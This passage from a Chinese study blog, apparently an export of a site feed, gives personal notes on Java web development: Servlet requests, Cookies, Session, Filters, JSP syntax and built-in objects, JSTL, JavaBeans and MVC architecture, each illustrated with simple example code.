class="language-jsp"><form action="/maven_java_web_01_war/res" method="post">    用户名：<input name="username" type="text"><br/>    密码： <input name="password" type="password" required><br/>    <input type="submit" name="提交"></form><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意</p></blockquote><ul><li>javaweb的运行终归是运行编译后的war包，所以项目路径是从war包的包名开始，而不是java文件的路径</li><li>404错误只是说明没有找到文件，是路径错误</li></ul><p>Request 主要有两个任务，获取数据和请求转发</p><h4 id="Request-获取数据与重定向"><a href="#Request-获取数据与重定向" class="headerlink" title="Request 获取数据与重定向"></a>Request 获取数据与重定向</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取数据</span>    String name <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String<span class="token punctuation">[</span><span class="token punctuation">]</span> has <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"has"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"=>"</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//重定向</span>    req<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/success.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getRequestDispatcher()方法中写入<code>\</code>会自动处理为项目设置的路径</li></ul><h2 id="Cookie、Session"><a href="#Cookie、Session" class="headerlink" title="Cookie、Session"></a>Cookie、Session</h2><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><blockquote><p>会话</p></blockquote><ul><li>用户打开浏览器，点击很多超链接 ，访问多个web资源后关闭浏览器的过程可以称为会话</li></ul><blockquote><p>有状态会话</p></blockquote><p><strong>==Cookie与Session的简单理解==</strong></p><p> <img src="image-20210908205600596.png" alt="image-20210908205600596"></p><p>有状态会话就像上图所述：</p><p>​    <strong>一个客户端访问了服务器，服务器就会知道这个客户，下次这个客户端再来，服务器会知道它曾经来过，这就叫有状态会话</strong></p><h3 id="保存会话的两种技术"><a href="#保存会话的两种技术" class="headerlink" title="保存会话的两种技术"></a>保存会话的两种技术</h3><blockquote><p>cookie</p></blockquote><ul><li>客户端技术。通过请求和响应</li></ul><blockquote><p>session</p></blockquote><ul><li>服务器行为。保存用户的会话信息</li></ul><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><blockquote><p>Cookie相关类</p></blockquote><p><img src="image-20210908214923045.png" alt="image-20210908214923045"></p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取cookie</span>        Cookie<span class="token punctuation">[</span><span class="token punctuation">]</span> cookies <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//判断是否存在值</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cookies <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Cookie cookie <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>cookie<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"lastLoginTime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">long</span> lastLoginTime <span class="token operator">=</span> Long<span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>cookie<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"你上次访问的时间是："</span><span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>lastLoginTime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"你是第一次登录本网站"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//返回新Cookie</span>        Cookie lastLoginTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"lastLoginTime"</span><span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>lastLoginTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210909135701396.png" alt="image-20210909135701396"></p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p> Session在打开浏览器时就已经存在，一个浏览器对应一个Session </p><p>SessionId每个用户时唯一的</p><p><img src="image-20210909144640718.png" alt="image-20210909144640718"></p><p><img src="image-20210909144713064.png" alt="image-20210909144713064"></p><blockquote><p>Session原理</p></blockquote><p><img src="image-20210909145150936.png" alt="image-20210909145150936"></p><p>用户访问网站，网站会自动登记用户的SessionID，并将用户的会话信息储存在Session中。当用户在次访问时，服务器就可以识别到用户的SessionId</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//解决乱码问题</span>    req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//得到Session</span>    HttpSession session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//向Session中存储内容</span>    session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"Mujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断Session是否时新创建的</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">isNew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Session是最新的"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Session已经创建"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//输出SessionId</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出Session储存的属性</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210909150824349.png" alt="image-20210909150824349"></p><h2 id="Filter过滤器"><a href="#Filter过滤器" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h2><p><img src="image-20210910174618753.png" alt="image-20210910174618753"></p><p>Filter过滤器本质上也是一个Servlet服务，只是调用不同</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Filteres</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment" spellcheck="true">//初始化</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment" spellcheck="true">//代码部分</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">,</span> FilterChain filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>     <span class="token annotation punctuation">@Override</span>    <span class="token comment" spellcheck="true">//销毁</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意</p></blockquote><ul><li>使用Filter需要导入包servlet</li><li>可以写多个过滤器</li><li>import 时需导入serlvet</li></ul><p><img src="image-20210910185616053.png" alt="image-20210910185616053"></p><blockquote><p>Filter特性</p></blockquote><ul><li>Filter处理请求无需让View特意转发或重定向请求，只需在web.xml中配置路径，只要经过规定路径的请求，都将进入这个过滤器</li><li><strong>注意，如果在xml中定义了路径，请求定义的路径有可能不会经过这样定义的过滤器</strong><br>  <strong>比如：定义路径<code>/res</code>，实际路径<code>org.mujie.servlet.res.java</code>，Filter定义如下，那么访问实际路径回经过该过滤器，而定义路径不会</strong></li><li><strong>Filter是在web服务器启动时就开始初始化，在web服务器关闭时才会销毁</strong></li></ul><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>encode<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--经过过这个路径的任何请求，都将经过这个过滤器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/servlet/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Chain 链</p></blockquote><ul><li>Filter过滤器需要写一个Chain，这是为了让请求和响应继续发送，而不是在过滤器中终止</li></ul><p><img src="image-20210910192140853.png" alt="image-20210910192140853"></p><h1 id="JSP原理"><a href="#JSP原理" class="headerlink" title="JSP原理"></a>JSP原理</h1><p><img src="image-20210909151636552.png" alt="image-20210909151636552"></p><p>JSP最终也会被转为Java类</p><p>JSP本质上就是一个Servlet，不过jsp简化了许多的对象，让我们的代码可以运行</p><blockquote><p>源码分析</p></blockquote><p><img src="image-20210909154402180.png" alt="image-20210909154402180"></p><blockquote><p>访问流程</p></blockquote><p><img src="image-20210909154610101.png" alt="image-20210909154610101"></p><p>在JSP页面中，Java代码会原封不动的输出，而Html代码会适用writer输出</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%@ page contentType="text/html;charset=UTF-8" language="java" %><html><head>    <title>name</title></head><body><%    String name = "Mujie";%>name:<%=name%></body></html><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210909155743092.png" alt="image-20210909155743092"></p><h2 id="JSP基础语法和命令"><a href="#JSP基础语法和命令" class="headerlink" title="JSP基础语法和命令"></a>JSP基础语法和命令</h2><blockquote><p>导入jstl</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.taglibs<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>taglibs-standard-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp.jstl/jstl --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet.jsp.jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSP作为Java技术的应用，在支持所有Java语法的同时，还有自己的一些扩充语法</p><blockquote><p>JSP表达式</p></blockquote><pre class="line-numbers language-jsp"><code class="language-jsp"><%=变量或表达式%><%= new java.util.Date()%>或者el表达式${}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>jsp脚本片段</p></blockquote><ul><li>简单说就是可以写多行代码的表达式</li></ul><pre class="line-numbers language-jsp"><code class="language-jsp"><%    int sum = 0;    for(int i = 1; i < 100 ; i++){        sum += i;    }    out.println("<h1>sum=" + sum + "</h1>")%>或者<%    for(int i = 0; i< 100; i++){%>    <h1>111</h1><%    }%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>写入外部（方法外部）代码【Jsp声明】</p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>   System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"外部方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>适用&lt;%! Java代码将被写在Jsp方法外，但还在类中</p><blockquote><p>注释</p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span>注释<span class="token operator">--</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jsp的代码不会在客户端显示，但可以抓包分析</p><blockquote><p>指令</p></blockquote><pre class="line-numbers language-jsp"><code class="language-jsp"><%@ 。。。%><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jsp指令用 &lt;%@ 包裹，一般写在jsp文件开始，用来规定一些配置等信息，比如错误页面，继承，导包等</p><pre class="line-numbers language-jsp"><code class="language-jsp">例如定制错误页面【建议写web.xml配置中】<%@ page errorPage="页面路径" %>或者<%@ page isErrorPage="true"%>显式的说明这是一个错误页面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用include包含页面会将两个页面合二为一</p><blockquote><p>Jsp标签</p></blockquote><pre class="line-numbers language-jsp"><code class="language-jsp"><jsp: ...><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> jsp:include 是拼接页面，本质还是三个页面，所有设置公有页面建议用这个</p><h2 id="九大内置对象"><a href="#九大内置对象" class="headerlink" title="九大内置对象"></a>九大内置对象</h2><p><img src="image-20210909205323014.png" alt="image-20210909205323014"></p><p><img src="image-20210909212052367.png" alt="image-20210909212052367"></p><blockquote><p>注意：</p></blockquote><ul><li>application实际上就是ServletContext，只是改了个名</li></ul><pre class="line-numbers language-jsp"><code class="language-jsp"><%    //四种方法设置属性    pageContext.setAttribute("name1","Mujie1"); //    request.setAttribute("name2","Mujie2");    session.setAttribute("name3","Mujie");    application.setAttribute("name4","Mujie4");%><%    //用一种方法取值    String name1 = (String) pageContext.findAttribute("name1");    String name2 = (String) pageContext.findAttribute("name2");    String name3 = (String) pageContext.findAttribute("name3");    String name4 = (String) pageContext.findAttribute("name4");    String name5 = (String) pageContext.findAttribute("name5");%>${name1}${name2}${name3}${name4}${name5}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为java的双亲委派机制和作用域、生命周期，虽然不是一个类中的setArrbute()方法，但仍然可以调用</p><p>当在其他页面访问时，会根据作用域视情况输出</p><p><img src="image-20210909215143933.png" alt="image-20210909215143933"></p><p>双亲委派机制，简单来说就是将请求逐级向上寻找，直到找到或者确认没有为止</p><p><img src="image-20210909215406560.png" alt="image-20210909215406560"></p><blockquote><p>各存储作用域使用场景</p></blockquote><p><img src="image-20210909220240965.png" alt="image-20210909220240965"></p><h2 id="JSP、JSTL标签"><a href="#JSP、JSTL标签" class="headerlink" title="JSP、JSTL标签"></a>JSP、JSTL标签</h2><ul><li>类别</li></ul><blockquote><p>核心标签</p><p>格式化标签</p><p>sql标签</p><p>XML 标签</p></blockquote><p>要使用Jstl标签，必须引用标签库</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %> // 核心标签库<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210910131737856.png" alt="image-20210910131737856"></p><blockquote><p>Jsp标签核心库语法</p></blockquote><p><img src="image-20210910141318665.png" alt="image-20210910141318665"></p><h1 id="JavaBean-Java组件"><a href="#JavaBean-Java组件" class="headerlink" title="JavaBean-Java组件"></a>JavaBean-Java组件</h1><p><img src="image-20210910142123907.png" alt="image-20210910142123907"></p><h2 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h2><ul><li>实体类和数据库中的字段一一对应</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlContext</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> String Sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SqlContext</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        Sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span>String sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"SqlContext{"</span> <span class="token operator">+</span>                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>                <span class="token string">", name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", Sex='"</span> <span class="token operator">+</span> Sex <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>连接数据库</p></blockquote><h1 id="MVC三层架构"><a href="#MVC三层架构" class="headerlink" title="MVC三层架构"></a>MVC三层架构</h1><ul><li>MVC 即Model 、view 、 Controller 试图，模型，控制器</li></ul><p><img src="image-20210910155617609.png" alt="image-20210910155617609"></p><blockquote><p>MVC架构 </p></blockquote><p><img src="image-20210910160821841.png" alt="image-20210910160821841"></p><p>简单来说</p><ul><li>用户只需要访问视图层</li><li>视图层将的操作和输入的数据发往控制器</li><li>控制器根据具体的数据以及处理情况，发给业务层（业务模块）处理</li><li>业务模块进行逻辑处理后再次发往控制器</li><li>由控制器将返回数据发送回视图层</li><li>视图层处理，输出内容</li></ul><p><img src="image-20210910161427454.png" alt="image-20210910161427454"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript日记</title>
      <link href="/2021/08/27/JavaScript%E6%97%A5%E8%AE%B0/"/>
      <url>/2021/08/27/JavaScript%E6%97%A5%E8%AE%B0/</url>
      
